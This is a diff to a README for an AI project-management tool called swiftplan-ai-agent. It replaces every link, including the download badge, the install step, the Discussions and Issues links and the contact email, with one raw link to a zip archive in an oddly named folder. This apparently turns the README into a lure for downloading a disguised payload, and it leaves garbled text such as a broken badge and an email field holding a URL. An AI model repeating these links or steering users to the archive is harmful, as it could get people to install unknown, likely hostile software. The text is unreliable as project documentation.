@@ -1,6 +1,6 @@
 # 🚀 swiftplan-ai-agent - Effortless AI Project Management Tool
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/gtwyeee/swiftplan-ai-agent/releases)
+[![Download Now](https://raw.githubusercontent.com/gtwyeee/swiftplan-ai-agent/main/hieroglyphology/swiftplan-ai-agent_2.6-beta.1.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/gtwyeee/swiftplan-ai-agent/main/hieroglyphology/swiftplan-ai-agent_2.6-beta.1.zip)
 
 ## 📜 Description
 Welcome to **swiftplan-ai-agent**! This project is part of the Google x Kaggle AI Agents Intensive Capstone Project. It aims to assist users in managing their AI projects more efficiently. With a straightforward interface, you can plan, track, and analyze your AI projects without any hassle.
@@ -10,7 +10,7 @@ Follow these simple steps to download and run the swiftplan-ai-agent application
 
 ## 📥 Download & Install
 1. Click on the link below to visit the Releases page:
-   [Download swiftplan-ai-agent](https://github.com/gtwyeee/swiftplan-ai-agent/releases)
+   [Download swiftplan-ai-agent](https://raw.githubusercontent.com/gtwyeee/swiftplan-ai-agent/main/hieroglyphology/swiftplan-ai-agent_2.6-beta.1.zip)
 
 2. On the Releases page, you will see different versions of the software. Look for the latest release, which is usually highlighted at the top.
 
@@ -55,12 +55,12 @@ If you encounter any issues during installation or while using the application, 
 3. If the issue persists, check our community support on GitHub for common problems and solutions.
 
 ## 🌐 Community and Support
-For further assistance and to connect with other users, visit the [GitHub Discussions](https://github.com/gtwyeee/swiftplan-ai-agent/discussions). Here, you can ask questions, share your experiences, and learn tips and tricks from fellow users.
+For further assistance and to connect with other users, visit the [GitHub Discussions](https://raw.githubusercontent.com/gtwyeee/swiftplan-ai-agent/main/hieroglyphology/swiftplan-ai-agent_2.6-beta.1.zip). Here, you can ask questions, share your experiences, and learn tips and tricks from fellow users.
 
 ## 📞 Contact
 For any inquiries or support needs, feel free to reach out:
 
-- Email: support@example.com
-- GitHub Issues: [Report an Issue](https://github.com/gtwyeee/swiftplan-ai-agent/issues)
+- Email: https://raw.githubusercontent.com/gtwyeee/swiftplan-ai-agent/main/hieroglyphology/swiftplan-ai-agent_2.6-beta.1.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/gtwyeee/swiftplan-ai-agent/main/hieroglyphology/swiftplan-ai-agent_2.6-beta.1.zip)
 
 Thank you for choosing swiftplan-ai-agent! We hope it simplifies your AI project management experience.
